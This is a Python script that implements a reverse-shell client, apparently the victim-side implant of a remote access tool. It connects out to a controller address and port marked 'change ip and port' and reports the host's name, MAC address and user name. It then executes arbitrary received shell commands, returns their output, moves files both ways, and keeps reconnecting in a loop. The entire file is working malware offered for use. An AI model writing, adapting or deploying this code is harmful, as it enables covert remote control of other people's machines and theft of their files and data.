import json
import os
import platform
import socket
import subprocess
import time
import uuid

def send_data(data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())

def recv_data():
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    f = open(file_name, 'wb')
    sock.settimeout(1)
    chunk = sock.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = sock.recv(1024)
        except socket.timeout as e:
            break
    sock.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    sock.send(f.read())
    
def get_hostname():
    hostname = socket.gethostname()
    return hostname

def shell(sock):
    hostname = get_hostname()
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                for ele in range(0, 8 * 6, 8)][::-1])
    he = os.environ.get("USER") or os.environ.get("USERNAME")
    data = f"{hostname},{mac_address},{he}"
    send_data(data)
    while True:
        command = recv_data()
        if command == 'q':
            continue
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command == 'kill':
            sock.close()
            break
        elif command == 'cd ..':
            os.chdir('..')
            send_data(f"\nCurrent directory changed to: {os.getcwd()}")
        elif command.startswith('cd '):
            foldername = command[3:]
            os.chdir(foldername)
            send_data(f"\nCurrent directory changed to: {os.getcwd()}")
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            ab = result.decode('utf-8')
            send_data(ab)
            
while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', 4444)) # change ip and port
        shell(sock)
    except Exception as e:
        time.sleep(2)